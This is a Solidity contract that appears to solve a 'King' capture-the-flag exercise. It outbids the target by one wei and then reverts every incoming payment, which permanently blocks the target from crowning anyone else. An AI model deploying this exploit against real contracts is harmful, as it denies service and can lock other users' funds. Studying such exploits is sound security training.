// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        King king = King(payable(contractAddress));
        uint256 prize = king._prize();

        // We send the prize + 1 wei (smallest unit)
        payable(contractAddress).call{value: prize + 1}("");
    }

    fallback() external payable {
        revert("Refusing transaction");
    }
}
